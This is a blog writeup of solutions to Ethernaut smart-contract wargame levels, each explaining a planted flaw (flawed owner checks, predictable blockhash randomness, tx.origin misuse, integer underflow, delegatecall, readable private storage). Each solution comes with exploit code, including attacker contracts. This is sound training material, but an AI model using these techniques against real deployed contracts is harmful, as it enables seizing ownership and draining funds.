---
layout: post
title: "Ethernaut writeup"
categories: posts
description: My ethernaut writeups
date: 2025-04-04 
en: true
authors: 
    - kappa
---

## Level 2 - Fallback
**Objective:** Become the contract owner.

### Vulnerability
To become the owner, we must surpass the current owner's contributions (1000 ETH). The `contribute()` function only allows donations of `<0.001 ETH`, making this impractical. However, the `receive()` function has flawed logic:

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0); // Bug: Checks >0 instead of > owner's contributions
    owner = msg.sender;
}
```

### Solution
Make a tiny contribution (e.g., 1 wei) via `contribute()`.

Send a direct transaction (even 1 wei) to trigger `receive()`:

```javascript
await sendTransaction({from: player, to: contract.address, value: toWei('0.0000001')});
await contract.withdraw();
```

## Level 3 - Fal1out
**Objective:** Claim ownership.

### Vulnerability
In older Solidity versions (fixed now), constructors required matching contract names. Here, the constructor `Fal1out()` is misspelled (with a 1), so it never executed during deployment:

```javascript
function Fal1out() public payable {  
    owner = msg.sender;
}
```

### Solution
Call the "constructor" manually:

```javascript
await contract.Fal1out();
```

## Level 4 - Coin Flip
**Objective:** Guess the flip outcome 10 times consecutively.

### Vulnerability
The "random" result is derived from the previous block’s hash, making it predictable and deterministic:

```javascript
uint256 blockValue = uint256(blockhash(block.number - 1));
bool side = (blockValue / FACTOR) == 1; 
```

### Solution
Deploy an attacker contract that pre-calculates the result:

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip{
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipPwn{
    ICoinFlip public target;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor(address _target){
    target = ICoinFlip(_target);
    }
    function attack() external{
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool guess = (blockValue / FACTOR) == 1;
        target.flip(guess);
    }
}
```

**Execution:**
- Deploy `CoinFlipPwn` with the target contract address.
- Call `attack()` 10 times (waiting for new blocks between calls).

## Level 5 - Telephone
**Objective:** Claim ownership.

- `tx.origin` - Always the user (EOA - External Owned Account) that signed the transaction, doesn't matter the intermediary.
- `msg.sender` - A contract can call another contract, so for example `EOA -> Contract A -> Contract B -> Contract C` sender of B is A and sender of C is B, meanwhile tx.origin of all of them is EOA
### Vulnerability
The `changeOwner()` function checks `tx.origin != msg.sender`, which can be bypassed via an intermediary contract:

```javascript
if (tx.origin != msg.sender) {  // tx.origin = EOA, msg.sender = attacker contract
    owner = _owner;
}
```

### Solution
Deploy a contract that calls `changeOwner()`:

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 

interface ITelephone{
    function changeOwner(address _owner) external;
    function owner() external view returns (address);
}

contract TelephonePwn {
    ITelephone public target;
    constructor(address _target){
    target = ITelephone(_target);
    }
    function attack(address _newOwner) external{
        target.changeOwner(_newOwner);
    }
}
```

## Level 6 - Token
**Objective:** Exploit integer underflow to gain tokens.

### Vulnerability
The `transfer()` function lacks underflow protection (fixed in newer Solidity versions):

```javascript
require(balances[msg.sender] - _value >= 0);  
```

### Solution
Transfer more tokens than you own (e.g., `2^256 - 1`):

```javascript
await contract.transfer(anyAddress, 2n**256n - 1n);
```

## Level 7 - Delegation
**Objective:** Claim ownership via `delegatecall`.

**delegatecall** - is a low-level function that allows one contract to call another contract and run its code within the context of the calling contract
### Solution
Call `pwn()` through `delegatecall`:

```javascript
await sendTransaction({
    to: contract.address,
    data: web3.eth.abi.encodeFunctionSignature("pwn()")
});
```

## Level 8 - Force *(In Progress)*

## Level 9 - Vault
**Objective:** Unlock the vault by reading "private" storage.

### Vulnerability
Private variables are still visible in contract storage.

### Solution
Read storage slot 1 (holds password):

```javascript
password = await web3.eth.getStorageAt(contract.address, 1);
```

Call `unlock()` with the password:

```javascript
await contract.unlock(password);
```
